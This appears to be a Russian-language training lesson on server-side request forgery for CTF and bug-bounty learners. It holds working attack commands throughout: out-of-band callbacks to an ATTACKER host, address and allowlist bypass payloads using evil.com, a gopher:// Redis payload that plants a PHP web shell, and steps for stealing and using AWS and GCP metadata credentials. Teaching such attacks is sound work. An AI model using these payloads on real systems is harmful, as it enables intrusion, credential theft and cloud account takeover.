---
id: web-ssrf
title: "SSRF: Server-Side Request Forgery"
category: web
parent: web-lfi-path-traversal
difficulty: medium
order: 2
tags: [ssrf, metadata, cloud, gopher, blind, internal]
prerequisites: [web-lfi-path-traversal]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как заставить сервер делать запросы: доступ к внутренним сервисам, облачным метаданным и цепочкам к RCE."
---

SSRF (Server-Side Request Forgery) — это заставить сервер выполнить HTTP-запрос (или другую сетевую операцию) по адресу, который вы контролируете. Это «пропуск» из внешнего интернета во внутреннюю сеть: через SSRF вы обращаетесь к сервисам, недоступным снаружи (Redis, внутренние API, облачные метаданные). SSRF — одна из самых ценных уязвимостей в облачную эру: доступ к `169.254.169.254` может выдать IAM-токены и захват облачного аккаунта.

## Теория: где живёт SSRF и что даёт

SSRF возникает там, где сервер сам ходит по URL, полученному от пользователя:
- «Импорт по ссылке», «проверка сайта», «загрузка аватара по URL»;
- вебхуки, коллбэки, интеграции;
- превью ссылок (link preview), генерация PDF/скриншотов;
- SSO/OIDC/JWKS-fetch, открытые прокси;
- XML-парсеры (XXE) — тоже SSRF-канал.

Что можно сделать:
1. **Сканировать внутреннюю сеть** (порты/хосты), определять живые сервисы.
2. **Читать облачные метаданные**: AWS `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, GCP `http://metadata.google.internal/computeMetadata/v1/`, Azure `http://169.254.169.254/metadata/instance?api-version=...`.
3. **Атаковать внутренние сервисы**: Redis (`gopher://`), Elasticsearch, Docker API, Kubernetes API, внутренние админки без auth.
4. **Обходить фильтры IP** (localhost, внутренние диапазоны).
5. **Достигать cloud metadata → IAM → полный захват.**

Классификация:
- **In-band** — видим ответ внутреннего сервиса.
- **Blind** — ответа нет; подтверждаем по времени или out-of-band (сервер обращается к нам).

## Инструменты: ручные payload, обход фильтров, gopher

**Базовая проверка** — указываем свой сервер и смотрим, придёт ли запрос:

```bash
# на нашем хосте
python3 -m http.server 8080
# payload
curl -s "https://target/fetch?url=http://ATTACKER:8080/test"
# в логе нашего сервера появится GET /test
```

**Доступ к localhost и внутренним адресам:**

```bash
curl -s "https://target/fetch?url=http://127.0.0.1:80/"
curl -s "https://target/fetch?url=http://localhost:8080/admin"
curl -s "https://target/fetch?url=http://169.254.169.254/latest/meta-data/"
```

**Обход фильтров «localhost/127.0.0.1/внутренние IP»:**

```
127.0.0.1        -> 127.1, 0.0.0.0, 0177.0.0.1, 2130706433, 0x7f000001
localhost        -> localhost.localdomain, [::1], ①②⑦.0.0.1 (Unicode)
http://127.0.0.1 -> http://127.0.0.1.nip.io, http://spoofed.ATTACKER (DNS rebinding)
запрет "169.254" -> http://169.254.169.254.nip.io, http://[::ffff:a9fe:a9fe]
```

**Протоколы (когда URL фильтруется по http/https):**

```
file:///etc/passwd
gopher://127.0.0.1:6379/_<redis-команды>
dict://127.0.0.1:6379/
ftp://...
http://127.0.0.1:6379/   (HTTP-запрос к Redis -> обычно ошибка, но можно)
```

**Gopher → Redis RCE.** `gopher://` позволяет отправить произвольные байты в TCP-порт. Так атакуют Redis:

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
# через RESP-команды: CONFIG SET dir /var/www/html, SET shell "<?php ...?>", SAVE
```

Для удобства payload генерируют скриптом (`gopherus`).

## Разобранный пример: SSRF → AWS metadata → захват аккаунта

Цель — `https://app.example/api/avatar`, принимающий `url` для загрузки аватара.

Шаг 1. Подтверждаем SSRF (OOB):

```bash
curl -s "https://app.example/api/avatar?url=http://ATTACKER:8080/a.png"
# в логе нашего сервера -> GET /a.png  (SSRF есть)
```

Шаг 2. Проверяем доступ к localhost:

```bash
curl -s "https://app.example/api/avatar?url=http://127.0.0.1:8080/"
# ответ внутреннего сервиса -> доступ есть
```

Шаг 3. Идём в облачные метаданные (AWS IMDSv1):

```bash
curl -s "https://app.example/api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# -> my-role

curl -s "https://app.example/api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role"
# -> {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
```

Шаг 4. Используем украденные креды:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
```

Часто этого достаточно для чтения бакетов/секретов. Если IMDSv2 обязателен (требуется токен через PUT), SSRF по GET может не сработать — тогда ищем другие сервисы.

Шаг 5. Альтернатива: внутренний Redis без пароля → запись веб-шелла:

```bash
# gopherus генерирует payload для gopher://
# CONFIG SET dir /var/www/html -> SET x "<?php system($_GET['c']);?>" -> SAVE
curl -s "https://app.example/api/avatar?url=<gopher-payload>"
curl -s "https://app.example/shell.php?c=id"
```

## Обход фильтров SSRF (шпаргалка)

| Фильтр | Обход |
|--------|-------|
| Запрет `127.0.0.1` | `127.1`, `0177.0.0.1`, `2130706433`, `0x7f000001`, `[::1]` |
| Запрет `localhost` | `localhost.localdomain`, DNS rebinding, `127.0.0.1.nip.io` |
| Запрет внутренних подсетей | `[::ffff:127.0.0.1]`, `127.0.0.1@evil.com`, редирект на внутренний хост |
| Только http/https | `gopher://`, `dict://`, `file://`, `ftp://` |
| Whitelist домена | `http://allowed.com@evil.com`, `http://evil.com#allowed.com` |
| Проверка префикса | `http://allowed.com.evil.com` |
| Запрет редиректов | редирект с вашего сервера на `http://169.254.169.254` |
| Строгая проверка IP | DNS rebinding (TTL=0, смена A-записи) |

## Типичные ошибки новичков

- **Не подтверждать SSRF через OOB.** Прежде чем копать, убедитесь, что сервер вообще ходит по вашему URL.
- **Сдаваться на «localhost запрещён».** Обходов десятки (десятичные/hex IP, nip.io, редиректы, DNS rebinding).
- **Забыть про облачные метаданные.** В облаке это главная цель; `169.254.169.254` — первое, что надо проверить.
- **Игнорировать `gopher://`.** Именно он открывает Redis/Memcached/MySQL для атак через SSRF.
- **Путать blind и in-band.** При blind не будет вывода — используйте время и OOB.
- **Не проверять редиректы.** Даже если прямой внутренний IP заблокирован, редирект с вашего сервера может его обойти.
- **Останавливаться на одном протоколе.** Если http не даёт — пробуйте file/gopher/dict.
- **Не смотреть на XXE.** XML-парсеры часто дают SSRF даже там, где обычная ручка закрыта.

## Полный разбор: SSRF → GCP metadata и сервисный аккаунт (с выводом)

GCP требует заголовок `Metadata-Flavor: Google`, но SSRF-ручка часто позволяет его задать (или подставить через CRLF/параметры). Цепочка:

```bash
# 1. проверяем доступ к metadata (нужен заголовок; некоторые ручки его пробрасывают)
curl -s "https://app.example/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
     -H 'X-Forwarded-Metadata-Flavor: Google'
# -> default/

# 2. забираем токен сервисного аккаунта
curl -s "https://app.example/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# -> {"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}

# 3. используем токен снаружи
curl -s -H "Authorization: Bearer ya29..." \
     "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29..."
```

Часто из-за жёсткого требования заголовка metadata недостижим через простой GET-SSRF — тогда ищем ручку, которая позволяет передать произвольные заголовки (`url` + `headers[]`), либо переходим на внутренние сервисы.

## SSRF-as-portscan: картирование внутренней сети

Даже blind SSRF позволяет сканировать порты по разнице времени отклика и по коду/ошибке:

```bash
# открытый порт -> быстрый ответ/иное сообщение; закрытый -> connect refused/timeout
for p in 22 80 443 3306 6379 8080 9200 2375; do
  t=$(curl -s -o /dev/null -w '%{time_total}' "https://target/fetch?url=http://127.0.0.1:$p/")
  echo "port $p: ${t}s"
done
# port 6379: 0.02s   -> Redis жив
# port 3306: 3.00s   -> MySQL закрыт/фильтруется
```

Идентификация сервиса по баннеру: Redis отдаёт `-ERR unknown command`, Elasticsearch — JSON с `version`, Docker API — `/version` с `ApiVersion`. Если ручка in-band, баннеры видно напрямую; при blind — по сигнатуре ошибок и времени.

## Reference-таблица: облачные metadata-эндпоинты

| Провайдер | URL | Нюанс |
|-----------|-----|-------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | GET, без заголовков |
| AWS IMDSv2 | тот же | нужен `PUT /latest/api/token` + `X-aws-ec2-metadata-token` |
| AWS creds | `/latest/meta-data/iam/security-credentials/<role>` | выдаёт ключи+токен |
| AWS user-data | `/latest/user-data` | скрипты, часто с секретами |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | нужен `Metadata-Flavor: Google` |
| GCP token | `.../instance/service-accounts/default/token` | OAuth-токен |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | нужен `Metadata: true` |
| Azure token | `.../metadata/identity/oauth2/token?resource=...&api-version=2018-02-01` | managed identity |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | JSON со всем сразу |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | отдельный IP |

## Обход современных защит (IMDSv2, allowlist, egress)

- **IMDSv2:** нужен `PUT` с токеном — SSRF по GET не проходит. Обход: искать ручку с методом `PUT` или с передачей заголовков; иногда приложение само ходит в metadata и кеширует токен.
- **DNS allowlist:** резолвится один раз, затем запрос идёт по другому IP (DNS rebinding). Поднимаем DNS-сервер с TTL=0, первый ответ — разрешённый IP, второй — `127.0.0.1`.
- **Редиректы:** если ручка следует редиректам, наш сервер отдаёт `302 Location: http://169.254.169.254/...` — фильтр URL видит только наш домен.
- **Строгий парсинг URL:** обходим `http://allowed.com@evil.com`, `http://evil.com#@allowed.com`, `http://allowed.com\.evil.com`.
- **Egress-фильтр:** если исходящий трафик ограничен, используйте DNS-эксфильтрацию (поддомен с данными в метке) — иногда она разрешена, даже когда HTTP наружу закрыт.
- **IPv6:** `[::ffff:169.254.169.254]`, `[::1]`, `[0:0:0:0:0:ffff:7f00:1]` обходят regex по IPv4.

## Что делать дальше / решение

1. **Подтвердить SSRF** через OOB (свой HTTP-сервер/коллаборатор).
2. **Проверить localhost и внутренние порты** (127.1, decimal, hex, `[::1]`).
3. **Облако?** — сразу metadata; IMDSv1 GET, GCP с заголовком, Azure с `Metadata: true`.
4. **Забрать креды/токены** и проверить их снаружи (`aws sts get-caller-identity`, GCP tokeninfo).
5. **Атаковать внутренние сервисы:** Redis/Elasticsearch/Docker/K8s через `gopher://` и HTTP.
6. **Обойти allowlist** редиректом, DNS rebinding, `@`-трюком.
7. Далее — устойчивый доступ: записать креды/токен, использовать их для чтения данных и pivot.

## SSRF в serverless и контейнерах

В контейнерах и serverless окружение иное, чем в классическом VM:

- **Docker/K8s:** метаданные недоступны, но есть `http://kubernetes.default.svc/` (API-сервер), `http://<svc>.<ns>.svc.cluster.local` (сервисы кластера), kubelet на `:10250`. Через SSRF можно обратиться к API-серверу и, при слабом RBAC, читать секреты: `GET /api/v1/namespaces/default/secrets`.
- **Serverless (Lambda):** metadata `http://169.254.169.254/...` (роль функции), переменные окружения через `/latest/meta-data` недоступны — но креды роли выдаются так же, как на EC2.
- **Docker socket:** если SSRF умеет `unix://` или есть локальный прокси к `/var/run/docker.sock`, можно создавать контейнеры → escape.
- **127.0.0.11** (Docker DNS) и `169.254.170.2` (ECS task metadata) — специфичные адреса, которые тоже стоит перебрать.

Практическое правило: перебирайте не только `127.0.0.1`, но и типовые адреса оркестратора — они часто открыты внутри контейнера без auth.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что такое SSRF?"
  options:
    - "Кража cookie"
    - "Заставление сервера делать запрос по вашему адресу"
    - "SQL-инъекция"
    - "Загрузка файла"
  answer: 1
  explanation: "Server-Side Request Forgery."
- question: "Какой адрес AWS metadata?"
  options:
    - "`127.0.0.1`"
    - "`169.254.169.254`"
    - "`8.8.8.8`"
    - "`0.0.0.0`"
  answer: 1
  explanation: "IMDS endpoint."
- question: "Как обойти запрет `127.0.0.1`?"
  options:
    - "Использовать `127.1`, `2130706433` или `[::1]`"
    - "Никак"
    - "Использовать `google.com`"
    - "Увеличить таймаут"
  answer: 0
  explanation: "Альтернативные представления IP."
- question: "Какой протокол позволяет слать произвольные байты (для атаки на Redis)?"
  options:
    - "`file://`"
    - "`gopher://`"
    - "`ftp://`"
    - "`http://`"
  answer: 1
  explanation: "Gopher отправляет сырые данные в TCP."
- question: "Как подтвердить blind SSRF?"
  options:
    - "Смотреть HTML"
    - "Заставить сервер обратиться к вашему OOB-серверу/коллаборатору"
    - "Запустить nmap"
    - "Никак"
  answer: 1
  explanation: "Out-of-band детект."
```

## Где пригодится

- **CTF (Web):** SSRF — путь к внутренним сервисам и облачным метаданным; часто финальный шаг к флагу/токенам.
- **Bug bounty:** SSRF к metadata/внутренним сервисам — critical (P1); blind SSRF тоже ценится.
- **Пентест:** SSRF — ключевой вектор для pivot во внутреннюю сеть из периметра.
- **Работа (AppSec):** whitelisting URL, запрет метаданных, IMDSv2, изоляция исходящего трафика — меры против SSRF.
